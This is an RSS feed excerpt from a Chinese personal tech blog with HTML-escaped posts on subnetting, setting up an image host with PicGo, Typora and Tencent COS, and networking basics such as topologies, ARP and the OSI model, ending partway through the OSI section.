&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;，即&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;/26
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;），将原网络划分为 4 个子网：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;子网1：&lt;code&gt;192.168.1.0/26&lt;/code&gt;（地址：&lt;code&gt;0&lt;/code&gt; ~ &lt;code&gt;63&lt;/code&gt;）&lt;/li&gt;
&lt;li&gt;子网2：&lt;code&gt;192.168.1.64/26&lt;/code&gt;（地址：&lt;code&gt;64&lt;/code&gt; ~ &lt;code&gt;127&lt;/code&gt;）&lt;/li&gt;
&lt;li&gt;子网3：&lt;code&gt;192.168.1.128/26&lt;/code&gt;（地址：&lt;code&gt;128&lt;/code&gt; ~ &lt;code&gt;191&lt;/code&gt;）&lt;/li&gt;
&lt;li&gt;子网4：&lt;code&gt;192.168.1.192/26&lt;/code&gt;（地址：&lt;code&gt;192&lt;/code&gt; ~ &lt;code&gt;255&lt;/code&gt;）&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;分配子网&lt;/strong&gt;：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;财务部用子网1，技术部用子网2，市场部用子网3，剩余子网4备用。&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;优势&lt;/strong&gt;：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;各部门流量互不干扰，安全性提升（可设置防火墙规则隔离子网）。&lt;/li&gt;
&lt;li&gt;广播范围缩小，网络性能优化。&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;hr&gt;
&lt;h2 id=&#34;-如何计算子网掩码&#34;&gt;&lt;strong&gt;🔧 如何计算子网掩码？&lt;/strong&gt;
&lt;/h2&gt;&lt;ol&gt;
&lt;li&gt;&lt;strong&gt;确定需求&lt;/strong&gt;：
&lt;ul&gt;
&lt;li&gt;需要多少子网？每个子网需要多少主机？&lt;/li&gt;
&lt;li&gt;例如：需要 4 个子网，每个子网至少 50 台设备。&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;选择子网掩码&lt;/strong&gt;：
&lt;ul&gt;
&lt;li&gt;主机部分至少需要 6 位（&lt;code&gt;2^6 - 2 = 62&lt;/code&gt; 台），网络部分则为 26 位（&lt;code&gt;32 - 6 = 26&lt;/code&gt;）。&lt;/li&gt;
&lt;li&gt;子网掩码为 &lt;code&gt;255.255.255.192&lt;/code&gt;（即 &lt;code&gt;/26&lt;/code&gt;）。&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;hr&gt;
&lt;h2 id=&#34;总结&#34;&gt;&lt;strong&gt;总结&lt;/strong&gt;
&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;子网&lt;/strong&gt;是网络的分区，就像城市划分成区；&lt;strong&gt;子网掩码&lt;/strong&gt;是划分规则，决定如何分配地址。&lt;/li&gt;
&lt;li&gt;划分子网能提升网络效率、安全性和管理便捷性。&lt;/li&gt;
&lt;li&gt;实际应用中，子网掩码的位数（如 &lt;code&gt;/24&lt;/code&gt;、&lt;code&gt;/26&lt;/code&gt;）直接决定了子网大小和数量。&lt;/li&gt;
&lt;/ul&gt;
</description>
        </item>
        <item>
        <title>使用 PicGo&#43;Typora&#43;COS 搭建图床服务</title>
        <link>https://Yerucrem.github.io/p/%E4%BD%BF%E7%94%A8-picgo-typora-cos-%E6%90%AD%E5%BB%BA%E5%9B%BE%E5%BA%8A%E6%9C%8D%E5%8A%A1/</link>
        <pubDate>Thu, 20 Mar 2025 00:00:00 +0000</pubDate>
        
        <guid>https://Yerucrem.github.io/p/%E4%BD%BF%E7%94%A8-picgo-typora-cos-%E6%90%AD%E5%BB%BA%E5%9B%BE%E5%BA%8A%E6%9C%8D%E5%8A%A1/</guid>
        <description>&lt;img src="https://yerucrembed-1314300122.cos.ap-nanjing.myqcloud.com/img/background04.jpg" alt="Featured image of post 使用 PicGo&#43;Typora&#43;COS 搭建图床服务" /&gt;&lt;h1 id=&#34;图床服务搭建过程&#34;&gt;图床服务搭建过程
&lt;/h1&gt;&lt;h2 id=&#34;简介&#34;&gt;简介
&lt;/h2&gt;&lt;p&gt;图床服务提供图片存储、图片加工处理、图片全网分发等功能，为全球无数的博客网站和社区论坛提供了后端图片服务支撑。开发者们可以使用腾讯云**对象存储（Cloud Object Storage，COS）**搭建图床服务，COS 是腾讯云提供的一种存储海量文件的分布式存储服务，提供了更丰富的功能、更优越的性能、更高的可靠性保障。&lt;/p&gt;
&lt;p&gt;COS 用于图床场景的优势有：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;**低成本：**存储单价低，按量付费，用多少算多少，还有资源包优惠。&lt;/li&gt;
&lt;li&gt;**不限速：**上传下载不限速，不再长时间等待 loading，访问质量也更好。&lt;/li&gt;
&lt;li&gt;**高可用：**有高等级的 SLA 可用性保障，存储的数据有高达99.9999999999%的持久性保障。&lt;/li&gt;
&lt;li&gt;**容量无限：**文件分布式存储，支持海量文件，容量按需使用。&lt;/li&gt;
&lt;/ol&gt;
&lt;h2 id=&#34;实践场景&#34;&gt;实践场景
&lt;/h2&gt;&lt;h3 id=&#34;场景一新增图片使用-cos-搭建图床服务&#34;&gt;场景一：新增图片使用 COS 搭建图床服务
&lt;/h3&gt;&lt;p&gt;本场景使用到以下工具：&lt;/p&gt;
&lt;p&gt;﻿&lt;a class=&#34;link&#34; href=&#34;https://molunerfinn.com/PicGo/&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;PicGo&lt;/a&gt;：一款支持多种云存储配置、快捷生成图片链接的工具。&lt;/p&gt;
&lt;p&gt;﻿&lt;a class=&#34;link&#34; href=&#34;https://typoraio.cn/&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;Typora&lt;/a&gt;：一款轻量级 Markdown 编辑器，支持多种输出格式，支持将本地图片一键上传至图床。&lt;/p&gt;
&lt;h4 id=&#34;操作步骤&#34;&gt;操作步骤
&lt;/h4&gt;&lt;h5 id=&#34;步骤一&#34;&gt;步骤一
&lt;/h5&gt;&lt;p&gt;安装 PicGo 并设置腾讯云 COS 服务相关参数。&lt;/p&gt;
&lt;p&gt;在 &lt;a class=&#34;link&#34; href=&#34;https://molunerfinn.com/PicGo/&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;PicGo 官网&lt;/a&gt; 下载和安装 PicGo 后，在图床设置里找到&lt;strong&gt;腾讯云 COS&lt;/strong&gt;，并配置以下相关参数项：&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://yerucrembed-1314300122.cos.ap-nanjing.myqcloud.com/img/image-20250320091246579.png&#34;
	
	
	
	loading=&#34;lazy&#34;
	
		alt=&#34;image-20250320091246579&#34;
	
	
&gt;&lt;/p&gt;
&lt;p&gt;COS 版本：选择 COS v5。&lt;/p&gt;
&lt;p&gt;设定 Secretld：开发者拥有的项目身份识别 ID，用于身份认证，可在 &lt;a class=&#34;link&#34; href=&#34;https://console.cloud.tencent.com/capi&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;API 密钥管理&lt;/a&gt; 页面中创建和获取。&lt;/p&gt;
&lt;p&gt;设定 SecretKey：开发者拥有的项目身份密钥，可在 &lt;a class=&#34;link&#34; href=&#34;https://console.cloud.tencent.com/capi&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;API 密钥管理&lt;/a&gt; 页面获取。&lt;/p&gt;
&lt;p&gt;设定 Bucket：存储桶，COS 中用于存储数据的容器。有关存储桶的进一步说明，请参见 &lt;a class=&#34;link&#34; href=&#34;https://cloud.tencent.com/document/product/436/13312&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;存储桶概述&lt;/a&gt; 文档。&lt;/p&gt;
&lt;p&gt;设定 AppId：开发者访问 COS 服务时拥有的用户维度唯一资源标识，用以标识资源，可在 &lt;a class=&#34;link&#34; href=&#34;https://console.cloud.tencent.com/capi&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;API 密钥管理&lt;/a&gt; 页面获取。&lt;/p&gt;
&lt;p&gt;设定存储区域：存储桶所属地域信息，枚举值可参见 &lt;a class=&#34;link&#34; href=&#34;https://cloud.tencent.com/document/product/436/6224&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;可用地域&lt;/a&gt; 文档，例如 ap-beijing、ap-hongkong、eu-frankfurt 等。&lt;/p&gt;
&lt;p&gt;设定存储路径：图片存放到 COS 存储桶中的路径。&lt;/p&gt;
&lt;p&gt;设定自定义域名：可选，若您为上方的存储空间配置了自定义源站域名，则可填写。相关介绍可参见 &lt;a class=&#34;link&#34; href=&#34;https://cloud.tencent.com/document/product/436/36638&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;开启自定义源站域名&lt;/a&gt;。&lt;/p&gt;
&lt;p&gt;设定网址后缀：通过在网址后缀添加 COS 数据处理参数实现图片压缩、裁剪、格式转换等操作，相关介绍可参见 &lt;a class=&#34;link&#34; href=&#34;https://cloud.tencent.com/document/product/436/54049&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;图片处理&lt;/a&gt;。&lt;/p&gt;
&lt;h5 id=&#34;步骤二&#34;&gt;步骤二
&lt;/h5&gt;&lt;p&gt;设置 typora（可选）&lt;/p&gt;
&lt;p&gt;设置指引如下：&lt;/p&gt;
&lt;p&gt;2.1 在 typora 的偏好设置的&lt;strong&gt;图像&lt;/strong&gt;中，进行如下配置：&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://yerucrembed-1314300122.cos.ap-nanjing.myqcloud.com/img/image-20250320091459589.png&#34;
	
	
	
	loading=&#34;lazy&#34;
	
		alt=&#34;image-20250320091459589&#34;
	
	
&gt;&lt;/p&gt;
&lt;p&gt;2.2 重启 typora，使设置生效。&lt;/p&gt;
&lt;p&gt;2.3 进入 typora 编辑器区域，直接拖放或粘贴图片，即可上传图片并自动替换为 COS 文件链接。（如果粘贴后没有自动替换为 COS 链接，可以检查 PicGo 中的 server 设置是否已打开）。&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://yerucrembed-1314300122.cos.ap-nanjing.myqcloud.com/img/image-20250320091714897.png&#34;
	
	
	
	loading=&#34;lazy&#34;
	
		alt=&#34;image-20250320091714897&#34;
	
	
&gt;&lt;/p&gt;
&lt;h3 id=&#34;场景二将原图床仓库图片快速迁移到腾讯云-cos&#34;&gt;场景二：将原图床仓库图片快速迁移到腾讯云 COS
&lt;/h3&gt;&lt;p&gt;以某图床服务举例，您可以找到本地图床文件夹，或从线上下载完整文件夹，并将文件夹中所有图片转存到 COS 存储桶。最后再统一替换链接域名即可恢复网站。&lt;/p&gt;
&lt;h4 id=&#34;操作步骤-1&#34;&gt;操作步骤
&lt;/h4&gt;&lt;ol&gt;
&lt;li&gt;下载原图床服务的图片。&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;登录原图床网站页面，下载此前已上传的图片文件夹。&lt;/p&gt;
&lt;ol start=&#34;2&#34;&gt;
&lt;li&gt;创建 COS 存储桶并设置防盗链。&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;2.1 注册腾讯云账号，创建一个访问权限为&lt;strong&gt;公有读私有写&lt;/strong&gt;的存储桶，操作指引请参见 &lt;a class=&#34;link&#34; href=&#34;https://cloud.tencent.com/document/product/436/13309&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;创建存储桶&lt;/a&gt;。&lt;/p&gt;
&lt;p&gt;2.2 创建存储桶后，在存储桶里打开防盗链设置，避免图片被盗刷，操作指引请参见 &lt;a class=&#34;link&#34; href=&#34;https://cloud.tencent.com/document/product/436/13319&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;设置防盗链&lt;/a&gt;。&lt;/p&gt;
&lt;ol start=&#34;3&#34;&gt;
&lt;li&gt;上传文件夹到存储桶。&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;在刚才已创建的存储桶里，单击上传文件夹，将刚才准备好的图片文件夹，上传到 COS 存储桶。操作指引请参见 &lt;a class=&#34;link&#34; href=&#34;https://cloud.tencent.com/document/product/436/13321&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;上传对象&lt;/a&gt;。&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://yerucrembed-1314300122.cos.ap-nanjing.myqcloud.com/img/image-20250320091759400.png&#34;
	
	
	
	loading=&#34;lazy&#34;
	
		alt=&#34;image-20250320091759400&#34;
	
	
&gt;&lt;/p&gt;
&lt;ol start=&#34;4&#34;&gt;
&lt;li&gt;全局替换链接域名&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;在 COS 控制台存储桶概览页，复制存储桶默认域名（也可以绑定自定义 CDN 加速域名）。使用常用代码编辑器，对项目全局搜索替换失效链接前缀为 COS 存储桶默认域名。&lt;/p&gt;
&lt;p&gt;vscode 搜索替换示例：&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://yerucrembed-1314300122.cos.ap-nanjing.myqcloud.com/img/image-20250320091831412.png&#34;
	
	
	
	loading=&#34;lazy&#34;
	
		alt=&#34;image-20250320091831412&#34;
	
	
&gt;&lt;/p&gt;
&lt;p&gt;sublime text 搜索替换示例：&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://yerucrembed-1314300122.cos.ap-nanjing.myqcloud.com/img/image-20250320091844634.png&#34;
	
	
	
	loading=&#34;lazy&#34;
	
		alt=&#34;image-20250320091844634&#34;
	
	
&gt;&lt;/p&gt;
</description>
        </item>
        <item>
        <title>网络基础</title>
        <link>https://Yerucrem.github.io/p/%E7%BD%91%E7%BB%9C%E5%9F%BA%E7%A1%80/</link>
        <pubDate>Thu, 20 Mar 2025 00:00:00 +0000</pubDate>
        
        <guid>https://Yerucrem.github.io/p/%E7%BD%91%E7%BB%9C%E5%9F%BA%E7%A1%80/</guid>
        <description>&lt;img src="https://yerucrembed-1314300122.cos.ap-nanjing.myqcloud.com/img/background06.jpg" alt="Featured image of post 网络基础" /&gt;&lt;h1 id=&#34;网络基础&#34;&gt;网络基础
&lt;/h1&gt;&lt;h2 id=&#34;lan简介&#34;&gt;LAN简介
&lt;/h2&gt;&lt;p&gt;多年来，已经对各种网络设计进行了实验和实施。对于网络，当我们提到术语 “拓扑” 时，我们实际上指的是手头网络的设计或外观。下面我们来讨论一下这些拓扑的优缺点。&lt;/p&gt;
&lt;h3 id=&#34;星形拓扑&#34;&gt;星形拓扑
&lt;/h3&gt;&lt;p&gt;&lt;img src=&#34;https://yerucrembed-1314300122.cos.ap-nanjing.myqcloud.com/img/image-20250320171027306.png&#34;
	
	
	
	loading=&#34;lazy&#34;
	
		alt=&#34;image-20250320171027306&#34;
	
	
&gt;&lt;/p&gt;
&lt;p&gt;星形拓扑的主要前提是设备通过中央网络设备（如交换机或集线器）单独连接。这种拓扑是当今最常见的拓扑，因为它具有可靠性和可扩展性 - 尽管成本高昂。&lt;/p&gt;
&lt;p&gt;发送到此拓扑中设备的任何信息都通过它所连接的中央设备发送。让我们在下面探讨一下这种拓扑的一些优点和缺点：&lt;/p&gt;
&lt;p&gt;由于此拓扑需要更多的布线和购买专用网络设备，因此它比任何其他拓扑都更昂贵。然而，尽管成本增加，但这确实提供了一些显着的优势。例如，这种拓扑本质上更具可扩展性，这意味着随着网络需求的增加，很容易添加更多设备。&lt;/p&gt;
&lt;p&gt;遗憾的是，网络规模越大，保持网络正常运行所需的维护就越多。这种对维护的依赖增加也会使故障排除变得更加困难。此外，星形拓扑结构仍然容易出现故障 - 尽管有所减少。例如，如果连接设备的集中式硬件发生故障，这些设备将无法再发送或接收数据。值得庆幸的是，这些集中式硬件设备通常很强大。&lt;/p&gt;
&lt;h3 id=&#34;总线拓扑&#34;&gt;总线拓扑
&lt;/h3&gt;&lt;p&gt;&lt;img src=&#34;https://yerucrembed-1314300122.cos.ap-nanjing.myqcloud.com/img/image-20250320171103707.png&#34;
	
	
	
	loading=&#34;lazy&#34;
	
		alt=&#34;image-20250320171103707&#34;
	
	
&gt;&lt;/p&gt;
&lt;p&gt;这种类型的连接依赖于称为主干电缆的单个连接。这种类型的拓扑类似于树的叶子，因为设备（叶子）从此电缆上的树枝所在的位置开始。&lt;/p&gt;
&lt;p&gt;由于发往每个设备的所有数据都沿着同一根电缆传输，因此如果拓扑中的设备同时请求数据，则很快就会变得缓慢和瓶颈。这种瓶颈还会导致非常困难的故障排除，因为很快就会变得难以识别哪个设备遇到了问题，所有数据都沿着同一路径传输。&lt;/p&gt;
&lt;p&gt;然而，话虽如此，总线拓扑是更容易设置且更具成本效益的拓扑之一，因为它们需要花费，例如用于连接这些设备的布线或专用网络设备。&lt;/p&gt;
&lt;p&gt;最后，总线拓扑的另一个缺点是，在发生故障时几乎没有冗余。这个缺点是因为沿主干电缆存在单点故障。如果此电缆断开，设备将无法再沿总线接收或传输数据。&lt;/p&gt;
&lt;h3 id=&#34;环形拓扑&#34;&gt;环形拓扑
&lt;/h3&gt;&lt;p&gt;&lt;img src=&#34;https://yerucrembed-1314300122.cos.ap-nanjing.myqcloud.com/img/image-20250320171139146.png&#34;
	
	
	
	loading=&#34;lazy&#34;
	
		alt=&#34;image-20250320171139146&#34;
	
	
&gt;&lt;/p&gt;
&lt;p&gt;环形拓扑（也称为令牌拓扑）具有一些相似之处。计算机等设备直接相互连接以形成一个环路，这意味着几乎不需要布线，并且对专用硬件（例如在星形拓扑中）的依赖较小。&lt;/p&gt;
&lt;p&gt;环形拓扑的工作原理是跨循环发送数据，直到数据到达目标设备，并使用循环中的其他设备转发数据。有趣的是，如果设备没有要发送的数据，则它只会从此拓扑中的另一台设备发送接收到的数据。如果设备恰好有数据要发送，它将先发送自己的数据，然后再从另一台设备发送数据。&lt;/p&gt;
&lt;p&gt;由于数据只有一个方向可以穿过此拓扑，因此对出现的任何故障进行故障排除相当容易。然而，这是一把双刃剑，因为它不是一种有效的数据通过网络传输的方式，因为它可能必须先访问许多多个设备才能到达预期的设备。&lt;/p&gt;
&lt;p&gt;最后，环形拓扑不太容易出现瓶颈，例如在总线拓扑中，因为大量流量不会在任何时候通过网络传输。但是，这种拓扑的设计确实意味着诸如电缆切断或设备损坏等故障将导致整个网络中断。&lt;/p&gt;
&lt;h3 id=&#34;什么是交换机&#34;&gt;什么是交换机？
&lt;/h3&gt;&lt;p&gt;交换机是网络中的专用设备，旨在聚合多个其他设备，例如计算机、打印机或任何其他使用以太网的支持联网的设备。这些不同的设备插入交换机的端口。交换机通常位于较大的网络中，例如企业、学校或类似规模的网络，其中有许多设备可以连接到网络。交换机可以通过 4、8、16、24、32 和 64 端口来连接大量设备，以便设备插入。&lt;/p&gt;
&lt;p&gt;交换机比较小的同类产品（集线器/中继器）效率更高。交换机跟踪连接到哪个端口的设备。这样，当它们收到数据包时，它不会像集线器那样将该数据包重复到每个端口，而是将其发送到预期目标，从而减少网络流量。&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://yerucrembed-1314300122.cos.ap-nanjing.myqcloud.com/img/image-20250320171220337.png&#34;
	
	
	
	loading=&#34;lazy&#34;
	
		alt=&#34;image-20250320171220337&#34;
	
	
&gt;&lt;/p&gt;
&lt;p&gt;交换机和路由器都可以相互连接。这样做的能力通过为数据添加多个路径来增加网络的冗余（可靠性）。如果一条路径出现故障，则可以使用另一条路径。虽然这可能会降低网络的整体性能，因为数据包必须花费更长的时间来传输，但没有停机时间 - 考虑到替代方案，这是一个很小的代价。&lt;/p&gt;
&lt;h3 id=&#34;什么是路由器&#34;&gt;什么是路由器？
&lt;/h3&gt;&lt;p&gt;路由器的工作是连接网络并在它们之间传递数据。它通过使用路由来实现这一点（因此得名 router）&lt;/p&gt;
&lt;p&gt;路由是给跨网络传输数据的过程的标签。路由涉及在网络之间创建路径，以便成功传送此数据。&lt;/p&gt;
&lt;p&gt;当设备通过许多路径连接时，路由非常有用，如下面的示例图所示。&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://yerucrembed-1314300122.cos.ap-nanjing.myqcloud.com/img/image-20250320171249840.png&#34;
	
	
	
	loading=&#34;lazy&#34;
	
		alt=&#34;image-20250320171249840&#34;
	
	
&gt;&lt;/p&gt;
&lt;h2 id=&#34;子网划分入门&#34;&gt;子网划分入门
&lt;/h2&gt;&lt;p&gt;正如我们之前在整个模块中讨论的那样，网络可以找到各种形状和大小 - 从小到大。子网划分是指将网络在其内部拆分为更小的微型网络。把它想象成为你的朋友切蛋糕。只有一定数量的蛋糕可以吃，但每个人都想分一杯羹。子网划分就是你决定谁得到什么份额，并保留这个比喻蛋糕的这样一块。&lt;/p&gt;
&lt;p&gt;以一家企业为例;您将拥有不同的部门，例如：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;会计学&lt;/li&gt;
&lt;li&gt;金融&lt;/li&gt;
&lt;li&gt;人力资源&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;img src=&#34;https://yerucrembed-1314300122.cos.ap-nanjing.myqcloud.com/img/image-20250320171414964.png&#34;
	
	
	
	loading=&#34;lazy&#34;
	
	
&gt;&lt;/p&gt;
&lt;p&gt;虽然您知道在现实生活中将信息发送到正确的部门的位置，但网络也需要知道。网络管理员使用子网划分对网络的特定部分进行分类和分配，以反映这一点。&lt;/p&gt;
&lt;p&gt;子网划分是通过拆分网络可容纳的主机数量来实现的，该主机数由称为子网掩码的数字表示。&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://yerucrembed-1314300122.cos.ap-nanjing.myqcloud.com/img/image-20250320171439472.png&#34;
	
	
	
	loading=&#34;lazy&#34;
	
		alt=&#34;image-20250320171439472&#34;
	
	
&gt;&lt;/p&gt;
&lt;p&gt;正如我们所记得的，IP 地址由四个称为八位字节的部分组成。子网掩码也是如此，它也表示为 4 个字节 （32 位） 的数字，范围从 0 到 255 （0-255）。&lt;/p&gt;
&lt;p&gt;子网以三种不同的方式使用 IP 地址：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;确定网络地址&lt;/li&gt;
&lt;li&gt;确定主机地址&lt;/li&gt;
&lt;li&gt;确定默认网关&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;让我们将这三个部分分为下表以了解它们的用途：&lt;/p&gt;
&lt;table&gt;
  &lt;thead&gt;
      &lt;tr&gt;
          &lt;th&gt;&lt;strong&gt;类型&lt;/strong&gt;&lt;/th&gt;
          &lt;th&gt;&lt;strong&gt;目的&lt;/strong&gt;&lt;/th&gt;
          &lt;th&gt;&lt;strong&gt;解释&lt;/strong&gt;&lt;/th&gt;
          &lt;th&gt;&lt;strong&gt;例&lt;/strong&gt;&lt;/th&gt;
      &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
      &lt;tr&gt;
          &lt;td&gt;网络地址&lt;/td&gt;
          &lt;td&gt;此地址标识实际网络的起点，并用于标识网络的存在。&lt;/td&gt;
          &lt;td&gt;例如，IP 地址为 192.168.1.100 的设备将位于由 192.168.1.0 标识的网络上&lt;/td&gt;
          &lt;td&gt;192.168.1.0&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;主机地址&lt;/td&gt;
          &lt;td&gt;此处的 IP 地址用于标识子网上的设备&lt;/td&gt;
          &lt;td&gt;例如，设备的网络地址为 192.168.1.1&lt;/td&gt;
          &lt;td&gt;192.168.1.100&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;默认网关&lt;/td&gt;
          &lt;td&gt;默认网关地址是分配给网络上设备的特殊地址，该地址能够将信息发送到另一个网络&lt;/td&gt;
          &lt;td&gt;任何需要发送到不在同一网络上的设备（即不在 192.168.1.0 上）的数据都将被发送到此设备。这些设备可以使用任何主机地址，但通常使用网络中的第一个或最后一个主机地址（.1 或 .254）&lt;/td&gt;
          &lt;td&gt;192.168.1.254&lt;/td&gt;
      &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;
&lt;p&gt;现在，在小型网络中，例如在家中，您将位于一个子网上，因为您一次需要连接超过 254 台设备的可能性不大。&lt;/p&gt;
&lt;p&gt;但是，企业和办公室等场所将拥有更多的此类设备（PC、打印机、相机和传感器），这些设备将进行子网划分。&lt;/p&gt;
&lt;p&gt;子网划分提供了一系列好处，包括：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;效率&lt;/li&gt;
&lt;li&gt;安全&lt;/li&gt;
&lt;li&gt;完全控制&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;稍后我们将继续探讨子网划分如何提供这些好处;但是，就目前而言，我们需要了解的只是它的安全元素。让我们以街上的典型咖啡馆为例。这家咖啡馆将有两个网络：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;一个用于员工、收银机和设施的其他设备&lt;/li&gt;
&lt;li&gt;一个供公众用作热点&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;子网划分允许您将这两个用例彼此分开，同时获得连接到更大网络（如 Internet）的好处。&lt;/p&gt;
&lt;h2 id=&#34;arp&#34;&gt;ARP
&lt;/h2&gt;&lt;p&gt;回顾我们之前的任务，设备可以有两个标识符：MAC 地址和 IP 地址，简称 A &lt;strong&gt;ddress&lt;/strong&gt; &lt;strong&gt;R&lt;/strong&gt;esolution &lt;strong&gt;P&lt;/strong&gt;rotocol 或简称 &lt;strong&gt;ARP&lt;/strong&gt;，是负责允许设备在网络上识别自己的技术。&lt;/p&gt;
&lt;p&gt;简单地说，ARP 允许设备将其 MAC 地址与网络上的 IP 地址相关联。网络上的每台设备都将保留与其他设备关联的 MAC 地址的日志。&lt;/p&gt;
&lt;p&gt;当设备希望与其他设备通信时，它们将向整个网络发送广播，以搜索特定设备。设备可以使用 ARP 查找设备的 MAC 地址（以及物理标识符）以进行通信。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;ARP 是如何工作的？&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;网络中的每个设备都有一个用于存储信息的分类账，称为缓存。在 &lt;strong&gt;ARP&lt;/strong&gt; 上下文中，此缓存存储网络上其他设备的标识符。&lt;/p&gt;
&lt;p&gt;为了将这两个标识符（IP 地址和 MAC 地址）映射在一起，ARP 发送两种类型的消息：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;&lt;strong&gt;ARP （ARP）请求&lt;/strong&gt;&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;ARP （ARP）答&lt;/strong&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;发送 &lt;strong&gt;ARP 请求&lt;/strong&gt;时，会在网络上向其他设备广播一条消息，询问“拥有此 IP 地址的 mac 地址是什么？当其他设备收到该消息时，它们只有在拥有该 IP 地址时才会响应，并将发送包含其 MAC 地址的 &lt;strong&gt;ARP 回复&lt;/strong&gt; 。请求设备现在可以记住此映射并将其存储在其 &lt;strong&gt;ARP 缓存&lt;/strong&gt;中以备将来使用。&lt;/p&gt;
&lt;p&gt;下图说明了此过程：&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://yerucrembed-1314300122.cos.ap-nanjing.myqcloud.com/img/image-20250320171530621.png&#34;
	
	
	
	loading=&#34;lazy&#34;
	
		alt=&#34;image-20250320171530621&#34;
	
	
&gt;&lt;/p&gt;
&lt;h2 id=&#34;osi模型&#34;&gt;OSI模型
&lt;/h2&gt;&lt;h3 id=&#34;什么是osi&#34;&gt;什么是OSI
&lt;/h3&gt;&lt;p&gt;&lt;strong&gt;OSI&lt;/strong&gt; 模型（或 &lt;strong&gt;O&lt;/strong&gt;pen &lt;strong&gt;S&lt;/strong&gt;ystems &lt;strong&gt;I&lt;/strong&gt;nterconnection 模型）是网络中使用的基本模型。 这个关键模型提供了一个框架，规定了所有联网设备将如何发送、接收和解释数据。&lt;/p&gt;
&lt;p&gt;OSI 模型的主要优点之一是，设备在与其他设备通信时可以在网络上具有不同的功能和设计。通过遵循 OSI 模型一致性的网络发送的数据可以被其他设备理解。&lt;/p&gt;
&lt;p&gt;OSI 模型由七层组成，如下图所示。每个层都有一组不同的职责，从第 7 层到第 1 层排列。&lt;/p&gt;
&lt;p&gt;在数据经过的每一层，都会发生特定的流程，并将信息添加到这些数据中，这就是我们将在本次会议中即将讨论的任务中讨论的内容。但是，现在，我们只需要了解此过程称为封装以及下图中 OSI 模型的外观：&lt;/p&gt;
